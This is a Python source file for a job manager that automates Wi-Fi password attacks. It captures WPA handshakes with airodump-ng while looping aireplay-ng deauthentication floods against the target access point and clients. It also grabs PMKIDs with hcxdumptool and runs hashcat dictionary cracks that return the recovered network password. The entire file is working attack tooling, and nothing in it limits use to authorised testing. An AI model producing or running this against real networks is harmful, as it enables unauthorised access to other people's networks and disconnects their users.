import re
import signal
import subprocess
import threading
import time
import uuid
from pathlib import Path
from typing import Optional


class TaskManager:
    """Tracks long-running jobs: handshake capture, PMKID capture, hashcat crack."""

    def __init__(self, captures_dir: Path):
        self.captures = captures_dir
        self.captures.mkdir(parents=True, exist_ok=True)
        self.lock = threading.Lock()
        self.jobs: dict = {}

    def _new(self, kind: str, meta: dict) -> str:
        tid = uuid.uuid4().hex[:8]
        with self.lock:
            self.jobs[tid] = {
                "id": tid,
                "kind": kind,
                "meta": meta,
                "status": "running",
                "started": time.time(),
                "ended": None,
                "log": [],
                "result": None,
                "procs": [],
            }
        return tid

    def _log(self, tid: str, line: str):
        with self.lock:
            if tid in self.jobs:
                self.jobs[tid]["log"].append(line.rstrip())
                self.jobs[tid]["log"] = self.jobs[tid]["log"][-500:]

    def _finish(self, tid: str, status: str, result=None):
        with self.lock:
            if tid in self.jobs:
                self.jobs[tid]["status"] = status
                self.jobs[tid]["ended"] = time.time()
                if result is not None:
                    self.jobs[tid]["result"] = result
                self.jobs[tid]["procs"] = []

    def list(self):
        with self.lock:
            return [
                {k: v for k, v in j.items() if k != "procs"}
                for j in self.jobs.values()
            ]

    def get(self, tid: str):
        with self.lock:
            j = self.jobs.get(tid)
            if not j:
                return None
            return {k: v for k, v in j.items() if k != "procs"}

    def cancel(self, tid: str):
        with self.lock:
            j = self.jobs.get(tid)
            if not j:
                return False
            for p in j.get("procs", []):
                try:
                    p.send_signal(signal.SIGINT)
                except Exception:
                    pass
            j["procs"] = []
        return True

    def start_handshake(self, iface: str, bssid: str, channel: int, essid: str, client: Optional[str] = None) -> str:
        tid = self._new("handshake", {"bssid": bssid, "channel": channel, "essid": essid, "client": client})
        t = threading.Thread(target=self._run_handshake, args=(tid, iface, bssid, channel, essid, client), daemon=True)
        t.start()
        return tid

    def _run_handshake(self, tid: str, iface: str, bssid: str, channel: int, essid: str, client: Optional[str]):
        safe_essid = re.sub(r"[^A-Za-z0-9_-]", "_", essid)[:24] or "net"
        base = self.captures / f"{safe_essid}_{bssid.replace(':', '')}"
        dump_cmd = [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", str(base),
            "--output-format", "pcap,csv",
            iface,
        ]
        self._log(tid, f"$ {' '.join(dump_cmd)}")
        dump = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        with self.lock:
            self.jobs[tid]["procs"].append(dump)
        time.sleep(2)

        deadline = time.time() + 90
        got_hs = False
        try:
            while time.time() < deadline:
                deauth_cmd = ["aireplay-ng", "--deauth", "5", "-a", bssid]
                if client:
                    deauth_cmd += ["-c", client]
                deauth_cmd.append(iface)
                self._log(tid, f"$ {' '.join(deauth_cmd)}")
                try:
                    r = subprocess.run(deauth_cmd, capture_output=True, text=True, timeout=15)
                    for line in (r.stdout + r.stderr).splitlines():
                        self._log(tid, line)
                except subprocess.TimeoutExpired:
                    self._log(tid, "deauth timed out")

                time.sleep(5)
                cap_file = Path(str(base) + "-01.cap")
                if cap_file.exists():
                    check = subprocess.run(
                        ["aircrack-ng", str(cap_file)],
                        capture_output=True, text=True,
                    )
                    if "1 handshake" in check.stdout or "WPA (1 handshake)" in check.stdout:
                        got_hs = True
                        self._log(tid, "handshake captured")
                        break
        finally:
            try:
                dump.send_signal(signal.SIGINT)
                dump.wait(timeout=3)
            except Exception:
                try:
                    dump.kill()
                except Exception:
                    pass

        cap_file = Path(str(base) + "-01.cap")
        result = {"capture": cap_file.name if cap_file.exists() else None, "handshake": got_hs}
        self._finish(tid, "completed" if got_hs else "failed", result)

    def start_pmkid(self, iface: str, bssid: str, essid: str, duration: int = 60) -> str:
        tid = self._new("pmkid", {"bssid": bssid, "essid": essid})
        t = threading.Thread(target=self._run_pmkid, args=(tid, iface, bssid, essid, duration), daemon=True)
        t.start()
        return tid

    def _run_pmkid(self, tid: str, iface: str, bssid: str, essid: str, duration: int):
        safe_essid = re.sub(r"[^A-Za-z0-9_-]", "_", essid)[:24] or "net"
        out = self.captures / f"{safe_essid}_{bssid.replace(':', '')}.pcapng"
        filter_file = self.captures / f".{bssid.replace(':', '')}.filter"
        filter_file.write_text(bssid.replace(":", "").lower() + "\n")
        cmd = [
            "hcxdumptool",
            "-i", iface,
            "-o", str(out),
            "--filterlist_ap", str(filter_file),
            "--filtermode", "2",
        ]
        self._log(tid, f"$ {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        with self.lock:
            self.jobs[tid]["procs"].append(proc)

        deadline = time.time() + duration
        try:
            while time.time() < deadline and proc.poll() is None:
                time.sleep(1)
        finally:
            try:
                proc.send_signal(signal.SIGINT)
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

        hc22000 = self.captures / f"{safe_essid}_{bssid.replace(':', '')}.hc22000"
        if out.exists():
            conv = subprocess.run(
                ["hcxpcapngtool", "-o", str(hc22000), str(out)],
                capture_output=True, text=True,
            )
            self._log(tid, conv.stdout)
            self._log(tid, conv.stderr)
        ok = hc22000.exists() and hc22000.stat().st_size > 0
        self._finish(tid, "completed" if ok else "failed", {"capture": out.name, "hash": hc22000.name if ok else None})

    def start_crack(self, hashfile: Path, wordlist: str, mode: str = "22000") -> str:
        tid = self._new("crack", {"hash": hashfile.name, "wordlist": wordlist, "mode": mode})
        t = threading.Thread(target=self._run_crack, args=(tid, hashfile, wordlist, mode), daemon=True)
        t.start()
        return tid

    def _run_crack(self, tid: str, hashfile: Path, wordlist: str, mode: str):
        pot = self.captures / f"{hashfile.stem}.potfile"
        cmd = ["hashcat", "-m", mode, "-a", "0", str(hashfile), wordlist, "--potfile-path", str(pot), "--status", "--status-timer=5"]
        self._log(tid, f"$ {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        except FileNotFoundError:
            self._log(tid, "hashcat not installed")
            self._finish(tid, "failed")
            return
        with self.lock:
            self.jobs[tid]["procs"].append(proc)
        for line in proc.stdout:
            self._log(tid, line)
        proc.wait()

        cracked = None
        if pot.exists():
            for line in pot.read_text().splitlines():
                parts = line.split(":")
                if len(parts) >= 5:
                    cracked = parts[-1]
                    break
        self._finish(tid, "completed" if cracked else "failed", {"password": cracked, "potfile": pot.name})
